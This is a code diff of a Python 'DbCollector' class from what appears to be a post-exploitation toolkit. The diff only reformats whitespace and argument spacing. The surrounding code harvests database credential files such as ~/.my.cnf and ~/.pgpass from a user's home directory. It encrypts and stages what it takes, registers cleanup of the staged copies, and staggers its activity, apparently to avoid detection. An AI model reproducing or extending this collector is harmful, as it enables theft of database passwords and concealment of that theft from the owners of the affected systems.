@@ -1,4 +1,3 @@
-
 from __future__ import annotations
 
 import logging
@@ -10,10 +9,11 @@ from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollect
 
 _LOG = logging.getLogger(__name__)
 
+
 class DbCollector(BaseCollector):
     """
     Collect local and cloud database configuration artifacts.
-    
+
     Targets:
       - ~/.my.cnf
       - ~/.pgpass
@@ -29,7 +29,7 @@ class DbCollector(BaseCollector):
             (".redis.conf", "redis"),
             ("mssql.conf", "mssql"),
         ]
-        
+
         for f, db_type in db_files:
             p = Path.home() / f
             if p.exists():
@@ -59,9 +59,9 @@ class DbCollector(BaseCollector):
             path = Path(artifact.source_path)
             if not path.exists():
                 return None
-            
-            data    = path.read_bytes()
-            sha256  = self._sha256(data)
+
+            data = path.read_bytes()
+            sha256 = self._sha256(data)
             payload = self._compress_and_encrypt(data)
             del data
 
@@ -71,10 +71,10 @@ class DbCollector(BaseCollector):
             self._register_cleanup(stage_path)
 
             record = CollectedFile(
-                path       = str(path),
-                sha256     = sha256,
-                size_bytes = len(payload),
-                metadata   = artifact,
+                path=str(path),
+                sha256=sha256,
+                size_bytes=len(payload),
+                metadata=artifact,
             )
             self.persist_metadata(record)
             self._stagger_and_pause()
